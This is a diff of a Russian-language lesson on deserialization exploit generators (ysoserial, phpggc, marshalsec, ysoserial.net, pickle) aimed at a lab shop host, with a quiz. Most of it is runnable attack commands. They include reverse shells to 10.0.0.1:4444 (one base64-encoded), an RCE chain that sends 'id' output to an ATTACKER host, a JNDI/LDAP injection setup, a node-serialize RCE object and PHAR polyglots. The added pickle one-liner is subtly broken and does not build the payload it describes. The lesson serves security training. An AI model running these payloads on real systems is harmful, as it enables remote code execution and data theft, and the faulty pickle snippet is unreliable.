@@ -15,462 +15,211 @@ estimated_minutes: 45
 summary: "Полный справочник генераторов gadget-цепочек: ysoserial (Java), ysoserial.net, phpggc, marshalsec (JNDI), node-serialize и pickle — с кодированием и встраиванием."
 ---
 
-Уязвимость десериализации опасна тем, что уязвимый `unserialize`/`readObject` запускает цепочку классов (gadget chain), приводящую к RCE. Писать такую цепочку руками — дни работы; поэтому используют готовые генераторы. В этом уроке — практический справочник: какой инструмент под какой язык, точные команды, кодирование payload и встраивание его в запрос. Минимум теории — максимум генерации и отправки.
+## Задача
 
-## Шпаргалка: генератор под язык
+Мы нашли на `https://shop.acme-lab.test/api/profile` бинарный blob, который начинается с base64 `rO0AB`. Это **Java-сериализация**: приложение принимает сериализованный объект и разбирает его (`readObject`). Если разбор небезопасен, можно подсунуть такой объект, который при разборе выполнит нашу команду.
+
+Писать такую «ловушку» руками — дни работы. Поэтому используют готовые **генераторы gadget-цепочек**. Разберём их по языкам.
+
+## Данные, с которыми работаем
+
+- Blob `rO0AB...` в теле `/api/profile` (Java).
+- Параметр `data`, куда уходит PHP-строка (потенциально `O:...`).
+- Возможный JNDI-выход: поле `url` в JSON.
+
+## Что такое gadget-цепочка
+
+**Gadget-цепочка** — последовательность обычных классов, которая при десериализации приводит к нужному эффекту (обычно к выполнению команды). Каждый класс сам по себе безобиден; опасен их порядок в потоке. Генератор просто собирает такой поток за нас.
+
+Первым делом определяем **формат**:
+
+| Признак | Язык/формат | Инструмент |
+|---------|-------------|-----------|
+| `rO0AB` (base64) / `\xac\xed\x00\x05` | Java | ysoserial |
+| `O:4:"User":...` | PHP | phpggc |
+| `AAEAAAD...` / BinaryFormatter | .NET | ysoserial.net |
+| сырые байты с `\x80\x04` | Python pickle | pickle |
+
+Шпаргалка «генератор под язык»:
 
 | Язык / протокол | Инструмент | Быстрая генерация |
 |-----------------|-----------|-------------------|
 | Java (RCE) | ysoserial | `java -jar ysoserial.jar CommonsCollections1 'id'` |
-| Java (JNDI) | marshalsec | `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://IP:8000/#Exploit"` |
-| .NET | ysoserial.net | `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64` |
+| Java (JNDI) | marshalsec | `marshalsec.jndi.LDAPRefServer "http://IP:8000/#Exploit"` |
+| .NET | ysoserial.net | `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` |
 | PHP | phpggc | `phpggc -b Monolog/RCE1 system id` |
 | PHP (PHAR) | phpggc | `phpggc -p phar -o z.phar Monolog/RCE1 system id` |
-| Node.js | node-serialize | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` |
-| Python | pickle | `pickle.dumps(RCE())` (класс с `__reduce__`) |
+| Python | pickle | класс с `__reduce__` + `pickle.dumps` |
 | Ruby | universal_gadget_chain | `ruby universal_gadget_chain.rb 'id'` |
-| Java (проверка) | ysoserial `URLDNS` | `java -jar ysoserial.jar URLDNS http://COLLAB` |
 
-## Карта инструментов по языкам
+## Шаг 1: Java — ysoserial
 
-| Язык | Инструмент | Формат payload |
-|------|-----------|----------------|
-| Java | **ysoserial** | сериализованный Java-объект (base64/raw) |
-| Java (JNDI) | **marshalsec** | LDAP/RMI-сервер для JNDI-инъекции |
-| .NET | **ysoserial.net** | BinaryFormatter/Json.NET/XAML и др. |
-| PHP | **phpggc** | PHP `serialize` / Phar |
-| Node.js | **node-serialize** | JS-объект с `_$$ND_FUNC$$_` |
-| Python | **pickle** (`pickletools`, `python2`) | pickle-поток |
-| Ruby | **Marshal** (`universal_gadget_chain`) | Marshal-поток |
-
-## ysoserial (Java): цепочки и использование
-
-Скачивание и запуск:
+Сначала — **безопасная проверка**. Цепочка `URLDNS` только делает DNS-запрос на твой listener, не выполняя код:
 
 ```bash
-java -jar ysoserial.jar 2>&1 | head -50    # список цепочек (gadgets)
+$ java -jar ysoserial.jar URLDNS 'http://COLLAB.oast.pro/' > probe.bin
+$ base64 -w0 probe.bin > probe.b64
+$ curl -s https://shop.acme-lab.test/api/profile -d @probe.b64
+# на listener пришёл DNS-запрос -> десериализация есть, можно идти дальше
 ```
 
-Список цепочек (полный, ysoserial master):
-
-| Цепочка | Требуемые библиотеки / примечание |
-|---------|-----------------------------------|
-| `CommonsCollections1` | commons-collections 3.1 |
-| `CommonsCollections2` | commons-collections4 4.0 |
-| `CommonsCollections3` | commons-collections 3.1 |
-| `CommonsCollections4` | commons-collections4 4.0 |
-| `CommonsCollections5` | commons-collections 3.1 |
-| `CommonsCollections6` | commons-collections 3.1 |
-| `CommonsCollections7` | commons-collections 3.1 |
-| `CommonsBeanutils1` | commons-beanutils |
-| `Spring1` | spring-core, spring-beans |
-| `Spring2` | spring-core, spring-beans (JDK ≤ 8u?) |
-| `Groovy1` | groovy |
-| `Hibernate1` | hibernate-core |
-| `Hibernate2` | hibernate-core |
-| `BeanShell1` | bsh |
-| `C3P0` | c3p0 |
-| `Click1` | click-nodeps |
-| `Clojure` | clojure |
-| `FileUpload1` | commons-fileupload |
-| `JBossInterceptors1` | jboss-interceptors, javassist |
-| `JavassistWeld1` | javassist, weld |
-| `Jdk7u21` | только JDK 7u21 (без внешних библиотек) |
-| `Jython1` | jython |
-| `JSON1` | json-lib |
-| `MozillaRhino1` | rhino |
-| `MozillaRhino2` | rhino |
-| `Myfaces1` | myfaces |
-| `Myfaces2` | myfaces |
-| `ROME` | rome |
-| `Vaadin1` | vaadin |
-| `Wicket1` | wicket |
-| `AspectJWeaver` | aspectjweaver (запись файла, не RCE) |
-| `DynamicDependencies` | только JDK (загрузка удалённых классов) |
-| `JRMPClient` | только JDK (обращение к вашему JRMPListener) |
-| `JRMPListener` | только JDK (серверная сторона, `ysoserial.exploit.JRMPListener`) |
-| `URLDNS` | только JDK (только DNS-проверка, не RCE) |
-
-Базовый вызов:
+Теперь боевая цепочка. Она подбирается по **библиотекам на цели** — «универсальной» нет:
 
 ```bash
-# выполнить команду, получить base64
-java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' | base64 -w0
-
-# сохранить raw-байты для прямой отправки
-java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' > payload.bin
+$ java -jar ysoserial.jar 2>&1 | grep -iE 'commons|spring|groovy'
+$ java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/$(id)' > cc6.bin
+$ base64 -w0 cc6.bin > cc6.b64
+$ curl -s https://shop.acme-lab.test/api/profile -d @cc6.b64 \
+  -H 'Content-Type: application/x-java-serialized-object'
+# listener: GET /uid=0(root)%20gid=0(root)   -> RCE подтверждён
 ```
 
-Важные детали:
-
-- **`-cp`/`--classpath`:** если у вас свои версии библиотек, укажите их: `java -cp ysoserial.jar:libs/commons-collections-3.1.jar ysoserial.payloads.CommonsCollections1 'id'`.
-- **Выбор цепочки:** не существует «универсальной». Подбирается по **версии и составу библиотек на цели**. CommonsCollections 3.1 ≠ 4.0 (разные цепочки), Spring1 требует spring-core.
-- **URLDNS** — безопасная проверка: только DNS-запрос на ваш Collaborator; подтверждает сам факт десериализации, не выполняя код.
-- **JRMPClient + JRMPListener** — когда нет подходящей библиотеки, но есть egress:
+Ключевые цепочки: `CommonsCollections1..7` (commons-collections 3.1/4.0), `CommonsBeanutils1`, `Spring1/2`, `Groovy1`, `Jdk7u21` (только JDK). Если подходящей библиотеки нет, но есть egress — `JRMPClient` + `JRMPListener`:
 
 ```bash
-# на атакующем: поднять слушателя
-java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'id'
-# payload, указывающий на слушателя
-java -jar ysoserial.jar JRMPClient 'attacker.local:1099' | base64 -w0
+$ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'id'
+$ java -jar ysoserial.jar JRMPClient 'attacker.local:1099' | base64 -w0
 ```
 
-## ysoserial.net (.NET)
+## Шаг 2: PHP — phpggc
+
+```bash
+$ phpggc -l | grep -i laravel              # список цепочек по фреймворку
+$ phpggc -b Monolog/RCE1 system 'id'       # base64-вывод
+$ phpggc Laravel/RCE5 system 'bash -c "id"' > laravel.bin
+```
+
+Цепочки называются `Фреймворк/Тип`: `Laravel/RCE1..RCE10`, `Symfony/RCE*`, `Monolog/RCE1`, `WordPress/RCE`. Типы: **RCE** — выполнение, **FD** — удаление файла, **FR** — чтение, **FW** — запись, а также SQLI/SSRF/XXE.
+
+Особый случай — **PHAR**: вредоносный объект прячется внутри phar-архива и срабатывает при **файловых операциях** над ним (`file_exists`, `getimagesize`), даже без явного `unserialize`:
+
+```bash
+$ phpggc -p phar -o evil.phar Monolog/RCE1 system id
+$ phpggc -p phar -pp 'GIF89a' -o evil.gif.phar Monolog/RCE1 system id   # полиглот GIF
+```
+
+Полиглот с префиксом `GIF89a` можно переименовать в `.gif` и протащить через загрузчик картинок.
+
+## Шаг 3: .NET — ysoserial.net
 
 ```powershell
-ysoserial.exe -l                                  # список gadgets
+ysoserial.exe -l
 ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
-ysoserial.exe -g ObjectDataProvider -f Xaml -c "calc.exe"
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationkey=... --validationalg=SHA1
 ```
 
-| Параметр | Значение |
-|----------|----------|
-| `-g` | gadget (см. таблицу gadgets) |
-| `-f` | formatter (см. таблицу formatters) |
-| `-c` | команда (для некоторых gadget — путь к .cs файлу) |
-| `-o` | output: `base64`, `raw`, `json`, `url` |
-| `--minify` | минимизировать payload |
-| `-l` | список gadgets |
-| `--fullhelp` | подробная справка по всем опциям |
-| `-p` | plugin (ViewState, DotNetNuke, SharePoint, Resx, ...) |
-| `--var`, `--variant` | вариант payload для gadget |
-| `--generator` | генератор для plugin (например ViewState) |
-| `--validationkey` | validation key для ViewState |
-| `--validationalg` | алгоритм валидации (SHA1, HMACSHA256, ...) |
-| `--decryptionkey` / `--decryptionalg` | ключ/алгоритм шифрования ViewState |
-| `--islegacy` | legacy-режим для ViewState |
-| `--minify` | убрать лишние байты |
-| `--rawcmd` | не экранировать команду |
-| `--outputfile` / `--of` | записать payload в файл |
-| `--test` | сгенерировать и проверить (не выполнять) |
-| `--searchformatter` | найти formatter, поддерживающий gadget |
+`-g` — gadget (`TypeConfuseDelegate`, `ObjectDataProvider`, `TextFormattingRunProperties`), `-f` — formatter (`BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `Json.NET`, `Xaml`), `-o` — формат вывода. Плагин `-p ViewState` собирает payload для ASP.NET ViewState (нужен ключ подписи или его отсутствие).
 
-**Gadgets (полный список ysoserial.net):**
+## Шаг 4: JNDI — marshalsec
 
-| Gadget | Примечание |
-|--------|-----------|
-| `TypeConfuseDelegate` | классика .NET (BinaryFormatter/LosFormatter) |
-| `TypeConfuseDelegateMono` | вариант для Mono |
-| `ObjectDataProvider` | XAML/BinaryFormatter, запуск процесса |
-| `TextFormattingRunProperties` | XAML, популярен для ViewState |
-| `ActivitySurrogateSelector` | .NET, обход type-check |
-| `ActivitySurrogateSelectorFromFile` | + компиляция .cs |
-| `ActivitySurrogateDisableTypeCheck` | отключает проверку типов |
-| `AxHostState` | WinForms |
-| `BaseActivationFactory` | .NET 5/6/7 + WPF, загрузка DLL |
-| `ClaimsIdentity` / `ClaimsPrincipal` | Windows Identity |
-| `WindowsIdentity` / `WindowsPrincipal` | импersonation |
-| `WindowsClaimsIdentity` | |
-| `DataSet` / `DataSetOldBehaviour` / `DataSetTypeSpoof` | DataSet |
-| `GenericPrincipal` / `RolePrincipal` | |
-| `GetterCompilerResults` | .NET 5/6/7, загрузка DLL |
-| `GetterSecurityException` | |
-| `GetterSettingsPropertyValue` | |
-| `ObjRef` | |
-| `PSObject` | PowerShell |
-| `ResourceSet` | |
-| `SessionSecurityToken` | |
-| `SessionViewStateHistoryItem` | |
-| `ToolboxItemContainer` | |
-| `XamlAssemblyLoadFromFile` | загрузка сборки из файла |
-| `XmlSerializer` (через плагины) | |
-
-**Formatters (полный список):**
-
-| Formatter | Где встречается |
-|-----------|-----------------|
-| `BinaryFormatter` | .NET remoting, многие десериализаторы |
-| `LosFormatter` | ASP.NET ViewState |
-| `ObjectStateFormatter` | ASP.NET ViewState (новый) |
-| `NetDataContractSerializer` | WCF |
-| `DataContractSerializer` | WCF |
-| `DataContractJsonSerializer` | WCF/JSON |
-| `SoapFormatter` | .NET remoting (Soap) |
-| `Xaml` | XAML-парсер |
-| `Json.NET` | Newtonsoft.Json |
-| `FastJson` | fastJSON |
-| `JavaScriptSerializer` | ASP.NET AJAX |
-| `XmlSerializer` | XML |
-| `MessagePackTypeless` / `MessagePackTypelessLz4` | MessagePack |
-| `SharpSerializerBinary` / `SharpSerializerXml` | SharpSerializer |
-| `YamlDotNet < 5.0.0` | YAML |
-| `FsPickler` | FsPickler |
-
-Пример для ViewState без MAC (или с известным ключом):
-
-```powershell
-ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=... --validationkey=... --validationalg=SHA1 --islegacy
-```
-
-## phpggc (PHP): цепочки и кодирование
+Классика Log4Shell и JNDI-инъекций. Поднимаем LDAP-сервер, отдающий ссылку на наш класс:
 
 ```bash
-phpggc -l                          # список цепочек
-phpggc -l Laravel                  # фильтр по фреймворку
-phpggc Monolog/RCE1 system 'id'    # цепочка + функция + команда
+$ python3 -m http.server 8000                # хостим Exploit.class
+$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.1:8000/#Exploit"
+$ curl -s 'https://shop.acme-lab.test/api?url=${jndi:ldap://10.0.0.1:1389/Exploit}'
 ```
 
-| Флаг | Значение | Пример |
-|------|----------|--------|
-| `-l`, `--list` | список всех цепочек (можно фильтровать) | `phpggc -l Laravel` |
-| `-i`, `--informations` | подробная инфо о цепочке | `phpggc -i symfony/rce1` |
-| `-b`, `--base64` | base64 (без переносов) | `phpggc -b Monolog/RCE1 system id` |
-| `-u`, `--url` | urlencode | `phpggc -u Monolog/RCE1 system id` |
-| `-s`, `--soft` | soft urlencode (читаемо, кодирует только спецсимволы) | `phpggc -s Monolog/RCE1 system id` |
-| `-j`, `--json` | JSON-кодирование | `phpggc -j Monolog/RCE1 system id` |
-| `-f`, `--fast-destruct` | fast-destruct (уничтожение объекта сразу после unserialize) | `phpggc -f Monolog/RCE1 system id` |
-| `-p`, `--phar FORMAT` | упаковать в PHAR/TAR/ZIP | `phpggc -p phar -o z.phar Monolog/RCE1 system id` |
-| `-pj`, `--phar-jpeg FILE` | PHAR-полиглот JPEG из картинки | `phpggc -pj dummy.jpg -o z.zip.phar Monolog/RCE1 system id` |
-| `-pp`, `--phar-prefix STR` | префикс для полиглота (напр. `GIF89a`) | `phpggc -p phar -pp 'GIF89a' -o z.gif.phar Monolog/RCE1 system id` |
-| `-pf`, `--phar-filename NAME` | имя файла внутри PHAR | `phpggc -p phar -pf shell.php -o z.phar Monolog/RCE1 system id` |
-| `-o FILE`, `--output FILE` | сохранить в файл | `phpggc -o payload.bin Monolog/RCE1 system id` |
-| `-w FILE`, `--wrapper FILE` | обёртка (process_object/process_serialized) | `phpggc -w my_wrapper.php slim/rce1 system id` |
-| `-se`, `--session-encode` | PHP session-кодирование | `phpggc -se Monolog/RCE1 system id` |
-| `-pub`, `--public-properties` | публичные свойства вместо защищённых | |
-| `-a`, `--ascii-strings` | только ASCII (без NULL-байтов) | |
-| `-A`, `--armor-strings` | все символы в hex-формате `S:` | |
-| `-n`, `--plus-numbers` | `+`-числа вместо обычных | |
-| `-N`, `--new` | создать шаблон новой цепочки | |
-| `-h`, `--help` | справка | |
+Синтаксис URL — `http://<host>:<port>/#<ClassName>`; слушатель по умолчанию на `1389` (LDAP) или `1099` (RMI).
 
-**Фреймворки и типы цепочек (полный список `phpggc -l`):**
+## Шаг 5: Python, Node, Ruby
 
-| Фреймворк/CMF | Доступные типы цепочек |
-|---------------|------------------------|
-| Bitrix | RCE1 |
-| CakePHP | RCE1, RCE2 |
-| CodeIgniter4 | FR1, RCE1–RCE6 |
-| Doctrine | FW1, FW2, RCE1, RCE2 |
-| Dompdf | FD1 |
-| Drupal | AT, FD, PsySH, RCE, SQLI, SSRF, XXE |
-| Drupal7 | FD, RCE, SQLI, SSRF |
-| Grav | FD1 |
-| Guzzle | FW1, INFO1, RCE1 |
-| Horde | RCE1 |
-| Joomla | FW1 |
-| Kohana | FR1 |
-| Laminas | FD1, FW1 |
-| Laravel | FD1, RCE1–RCE10 |
-| Magento | FW1, SQLI1 |
-| Magento2 | FD1 |
-| MediaWiki | FD1, FW1, RCE1 |
-| Monolog | FW1, RCE1 |
-| OpenCart | FW1, RCE1 |
-| PHPCSFixer | FD1 |
-| PHPExcel | FD1 |
-| PHPSecLib | RCE1 |
-| PHPWord | FD1 |
-| Phalcon | RCE1 |
-| Phing | FD1 |
-| Plates | RCE1 |
-| Pydio | (Guzzle) |
-| Silverstripe | FD1 |
-| Slim | RCE1 |
-| Smarty | FD1, SSRF1 |
-| Snappy | FD1 |
-| Spiral | RCE1 |
-| Sulu | RCE1 |
-| SwiftMailer | FD1, FR1, FW1 |
-| Symfony | FD1, FW1, RCE1–RCE… |
-| TCPDF | FD1 |
-| ThinkPHP | FW1, RCE1 |
-| Typo3 | FD1 |
-| WordPress | Dompdf, Guzzle, P1, PHPExcel, RCE, generic |
-| Yii | RCE1 |
-| Yii2 | RCE1 |
-| ZendFramework | FD1, RCE1 |
-| phpThumb | FD1 |
-| vBulletin | RCE1 |
+- **Python pickle:** класс с `__reduce__`, возвращающим вызов функции:
+  `python3 -c "import pickle,os; print(pickle.dumps(os.system('id')))" > p.bin`
+- **Node.js:** объект с ключом `_$$ND_FUNC$$_` в `node-serialize`.
+- **Ruby:** `universal_gadget_chain.rb 'id'` (Marshal).
 
-Типы: **RCE** — выполнение кода, **FD** — file delete, **FR** — file read, **FW** — file write, **SQLI/SSRF/XXE/INFO/AT/PsySH** — соответствующая примитива.
+## Встраивание payload
 
-Примеры:
+Payload нужно закодировать под контекст: `base64 -w0` для тела, `phpggc -u`/`-s` для URL, `-j` для JSON. Часто payload кладут в cookie или заголовок — там нужен `urlencode`.
 
-```bash
-# RCE через Monolog
-phpggc -b Monolog/RCE1 system 'id'
-# Laravel (популярно на реальных таргетах)
-phpggc -b Laravel/RCE5 system 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
-# PHAR-десериализация (загрузка файла → срабатывает на file_ops)
-phpggc -p phar -o evil.phar Monolog/RCE1 system id
-# Готовый phar с полиглотом (GIF + phar)
-phpggc -p phar -pp 'GIF89a' -o evil.gif.phar Monolog/RCE1 system id
-```
+## Полный прогон от начала до конца
 
-Ключевой нюанс: PHAR-цепочки срабатывают **при файловых операциях** над phar-файлом (`file_exists`, `getimagesize`, `md5_file`), даже без явного `unserialize`. Имя файла-полиглота можно переименовать в `.jpg`/`.gif` для обхода загрузчиков.
+1. Blob → `base64 -d | xxd` → определить формат (`aced 0005` = Java).
+2. `ysoserial URLDNS` → безопасно подтвердить десериализацию (DNS на listener).
+3. Подобрать цепочку по библиотекам → сгенерировать payload.
+4. `base64 -w0` → отправить в уязвимое поле.
+5. Listener → получить `uid=0(root)` → RCE подтверждён.
+6. Для PHP — `phpggc` (при загрузке — PHAR-полиглот).
 
-## marshalsec (JNDI/LDAP/RMI)
+## Если не сработало
 
-`marshalsec` поднимает LDAP/RMI-сервер, отдающий ссылку на вредоносный класс. Классика log4shell и JNDI-инъекций.
+- **Цепочка не подошла.** Нужна **та же** библиотека и версия на цели; сверяй состав (`GadgetProbe`, ошибки).
+- **Нет egress.** JNDI/JRMP не достучатся — используй локальную цепочку без callback.
+- **PHAR не срабатывает.** Файл должен участвовать в файловой операции; имя-полиглот помогает обойти загрузчик.
+- **Blob отклонён.** Проверь `Content-Type` (`application/x-java-serialized-object`) и точное поле.
+- **WAF режет.** Кодируй payload (base64/urlencode) и пробуй в другом месте (cookie, заголовок).
 
-```bash
-# 1. Скомпилировать вредоносный класс (Exploit.java → Exploit.class)
-# 2. Поднять HTTP-сервер с классом
-python3 -m http.server 8000
-# 3. Поднять LDAP-сервер, отдающий ссылку на класс
-java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.1:8000/#Exploit"
-```
+## Что мы теперь знаем
 
-**JNDI-серверы marshalsec:**
+- Сначала определяем формат (`rO0AB`, `O:`, BinaryFormatter, pickle).
+- `ysoserial` — Java, `ysoserial.net` — .NET, `phpggc` — PHP, `marshalsec` — JNDI.
+- Цепочка подбирается по библиотекам цели; «универсальной» нет.
+- `URLDNS` — безопасная проверка десериализации.
+- Payload кодируется под контекст (base64/urlencode) и встраивается в запрос.
 
-| Класс | Что отдаёт | Пример |
-|-------|-----------|--------|
-| `marshalsec.jndi.LDAPRefServer` | LDAP-ссылка на удалённый класс | `...LDAPRefServer "http://IP:8000/#Exploit"` |
-| `marshalsec.jndi.RMIRefServer` | RMI-ссылка на удалённый класс | `...RMIRefServer "http://IP:8000/#Exploit"` |
+## На что смотреть дальше
 
-Синтаксис URL: `http://<host>:<port>/#<ClassName>` — `#` отделяет имя класса; слушатель по умолчанию на порту `1389` (LDAP) / `1099` (RMI), можно указать второй аргумент-порт.
-
-**Gadget-цепочки marshalsec (для других протоколов сериализации):**
-
-| Класс | Формат |
-|-------|--------|
-| `marshalsec.Java` | Java-сериализация (свой аналог ysoserial) |
-| `marshalsec.BlazeDSAMF0/AMF3/AMF3AM/AMFX` | BlazeDS AMF |
-| `marshalsec.Red5AMF0/AMF3` | Red5 AMF |
-| `marshalsec.Burlap` | Burlap |
-| `marshalsec.Castor` | Castor XML |
-| `marshalsec.Hessian` / `Hessian2` | Hessian |
-| `marshalsec.Jackson` | Jackson (polymorphic) |
-| `marshalsec.JYAML` | JYAML |
-| `marshalsec.JsonIO` | JsonIO |
-| `marshalsec.Kryo` | Kryo |
-| `marshalsec.SnakeYAML` | SnakeYAML |
-| `marshalsec.XStream` | XStream |
-| `marshalsec.YAMLBeans` | YAMLBeans |
-
-Payload для JNDI-инъекции (log4shell):
-
-```
-${jndi:ldap://10.0.0.1:1389/Exploit}
-```
-
-Ограничения: современные JDK (>= 8u191, 11.0.1, 17) блокируют загрузку удалённых классов по умолчанию (`com.sun.jndi.ldap.object.trustURLCodebase=false`). Тогда используют локальные фабрики/цепочки (Tomcat BeanFactory, `org.apache.naming.factory.BeanFactory` + EL) — но это уже требует своей gadget-библиотеки.
-
-## node-serialize / JS
-
-Для модуля `node-serialize` уязвим `unserialize` с функциями `_$$ND_FUNC$$_`:
-
-```javascript
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
-```
-
-Обратите внимание на `()` в конце — немедленный вызов. Payload можно передать в cookie/base64-параметре, который приложение десериализует.
-
-## Python pickle
-
-```python
-import pickle, os, base64
-class RCE:
-    def __reduce__(self):
-        return (os.system, ('id',))
-print(base64.b64encode(pickle.dumps(RCE())).decode())
-```
-
-Проверка и разбор подозрительного потока:
-
-```bash
-pickletools dis payload.pkl     # дизассемблировать pickle
-```
-
-Уязвим также `yaml.load` (не `safe_load`) — payload: `!!python/object/apply:os.system ["id"]`.
-
-## Ruby Marshal
-
-Инструмент `universal_gadget_chain` (или `marshal` payloads из metasploit):
-
-```bash
-ruby universal_gadget_chain.rb 'id' | base64
-```
-
-## Кодирование и встраивание payload
-
-Payload почти никогда не отправляют как есть — его нужно встроить в конкретный транспорт:
-
-| Транспорт | Кодирование |
-|-----------|-------------|
-| Cookie (URL) | base64 → urlencode |
-| JSON-поле | base64 (raw-байты в JSON недопустимы) |
-| Заголовок | base64 (без `+`/`/` при возможности — используйте base64url) |
-| POST form | urlencode сырых байтов |
-| Java `ObjectInputStream` | raw-байты (не base64) |
-| PHAR-загрузка | файл как есть, полиглот с префиксом |
-
-Полезные команды:
-
-```bash
-base64 -w0 payload.bin
-base64 -w0 payload.bin | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))"
-# base64url
-base64 -w0 payload.bin | tr '+/' '-_' | tr -d '='
-```
-
-## Практический workflow
-
-1. **Определить язык и точку десериализации.** Java: `rO0AB`/`AC ED 00 05`; PHP: `O:`/`a:`; .NET: `AAEAAAD`/`/wEPDw`; Python: `gASV`/`\x80\x04`; Node: `_$$ND_FUNC$$_`.
-2. **Проверить факт десериализации безопасно.** Java → `URLDNS` с Collaborator; PHP → простой `O:8:"stdClass":0:{}`.
-3. **Определить состав библиотек** (по ошибкам, версиям фреймворка, `Server`-заголовкам, утечкам).
-4. **Выбрать цепочку** под эти библиотеки: `ysoserial <chain>` / `phpggc <framework>/RCE<n>`.
-5. **Сгенерировать и закодировать** под транспорт.
-6. **Отправить и подтвердить** — reverse shell или запись маркера.
-7. **Зафиксировать PoC** — точная команда генерации + запрос.
-
-## Частые ошибки
-
-- **Неподходящая цепочка.** `CommonsCollections1` не сработает, если на цели commons-collections 4.x — нужна другая цепочка.
-- **Забыть про base64/urlencode.** Raw-байты в cookie/JSON не долетят.
-- **Путать проверку с эксплуатацией.** `URLDNS` подтверждает десериализацию, но не даёт RCE.
-- **Игнорировать версию JDK при JNDI.** На новых JDK удалённая загрузка классов запрещена.
-- **Забыть про PHAR-триггер.** PHAR-цепочка срабатывает только при файловой операции над файлом.
-- **Уронить сервис.** Некоторые цепочки/классы могут вызвать ошибку загрузки; тестируйте безопасным маркером.
+- **Скачанный PoC — недоверенный код.** Прочитай, убери эксфильтрацию, направь callback на себя.
+- **Версия библиотеки.** `CommonsCollections 3.1` ≠ `4.0`; сверяй перед генерацией.
+- **PHAR — скрытый вектор.** Срабатывает на file-ops без `unserialize`.
+- **Не убей цель.** Некоторые payload деструктивны — проверяй на стенде.
+- **Один foothold — не шлюз для флуда.** Не гоняй массовые запросы через нестабильный RCE.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какой инструмент генерирует gadget-цепочки для Java?"
+- question: "Что означает начало blob'а rO0AB?"
   options:
-    - "phpggc"
+    - "PHP-сериализация"
+    - "Java-сериализация (base64 от aced 0005)"
+    - "Python pickle"
+    - "Сжатый JSON"
+  answer: 1
+  explanation: "rO0AB — base64 от магических байтов Java-сериализации."
+- question: "Зачем в ysoserial используют цепочку URLDNS?"
+  options:
+    - "Чтобы выполнить команду"
+    - "Чтобы безопасно подтвердить десериализацию одним DNS-запросом"
+    - "Чтобы сжать payload"
+    - "Чтобы обойти TLS"
+  answer: 1
+  explanation: "URLDNS только обращается к твоему DNS-listener, без выполнения кода."
+- question: "Какой генератор нужен для PHP-цепочек?"
+  options:
     - "ysoserial"
-    - "pickletools"
-    - "dalfox"
+    - "phpggc"
+    - "marshalsec"
+    - "ysoserial.net"
   answer: 1
-  explanation: "ysoserial — генератор Java-цепочек (CommonsCollections и др.)."
-- question: "Что делает цепочка URLDNS в ysoserial?"
+  explanation: "phpggc генерирует цепочки для Laravel/Symfony/Monolog и др."
+- question: "Чем особенный PHAR-payload?"
   options:
-    - "Выполняет команду на цели"
-    - "Только инициирует DNS-запрос (безопасная проверка десериализации)"
-    - "Пишет файл"
-    - "Поднимает reverse shell"
+    - "Он срабатывает только по HTTPS"
+    - "Он активируется при файловых операциях над phar-файлом, даже без явного unserialize"
+    - "Он работает только в Windows"
+    - "Он не требует кодирования"
   answer: 1
-  explanation: "URLDNS не даёт RCE — только DNS-обращение на Collaborator."
-- question: "Какой флаг phpggc кодирует payload в base64?"
+  explanation: "PHAR-метаданные десериализуются при file-ops (file_exists, getimagesize и т.п.)."
+- question: "Для чего marshalsec в контексте JNDI-инъекций?"
   options:
-    - "-u"
-    - "-b"
-    - "-p"
-    - "-f"
+    - "Генерирует Java-цепочки"
+    - "Поднимает LDAP/RMI-сервер, отдающий ссылку на вредоносный класс"
+    - "Кодирует payload в base64"
+    - "Сканирует порты"
   answer: 1
-  explanation: "`-b` — base64, `-u` — urlencode, `-p` — phar, `-f` — fast-destruct."
-- question: "Чем ограничена JNDI-эксплуатация через marshalsec на новых JDK?"
-  options:
-    - "Не поддерживается LDAP"
-    - "Запрещена загрузка удалённых классов (trustURLCodebase=false)"
-    - "Не работает base64"
-    - "Нужен Windows"
-  answer: 1
-  explanation: "С JDK 8u191+/11.0.1+/17 удалённая кодовая база по умолчанию запрещена."
-- question: "При каком условии срабатывает PHAR-цепочка?"
-  options:
-    - "При любом HTTP-запросе"
-    - "При файловой операции над phar-файлом"
-    - "Только при unserialize"
-    - "Только при загрузке на сервер"
-  answer: 1
-  explanation: "PHAR-метаданные десериализуются при file_ops (file_exists, md5_file и т.п.)."
+  explanation: "marshalsec.jndi.LDAPRefServer отдаёт ссылку на класс по JNDI."
 ```
+
+## Куда дальше
+
+Дальше (`web-tool-injection-tools`) мы разберём инструменты инъекций — `sqlmap`, `commix`, `tplmap`, `dalfox`. А пока главное запомни: десериализация — это подбор цепочки под **конкретную** библиотеку цели, и первым шагом всегда идёт безопасная проверка.
 
 ## Где пригодится
 
-- **CTF (Web):** Java/PHP deserialization — частые задачи; готовые цепочки экономят часы.
-- **Bug bounty:** десериализация в cookie/параметре — критичный баг с высоким payout.
-- **Пентест:** цепочка JNDI/PHAR — стандартный путь к RCE в корпоративных Java/PHP-приложениях.
-- **Работа (AppSec):** знание цепочек помогает находить небезопасные точки в коде и при ревью.
+- **CTF (Web):** Java/PHP-десериализация — частый тип задач; генераторы экономят часы.
+- **Bug bounty:** корректная цепочка и PHAR-полиглот часто решают исход.
+- **Пентест:** проверка десериализации входит в аудит Java/.NET/PHP-стеков.
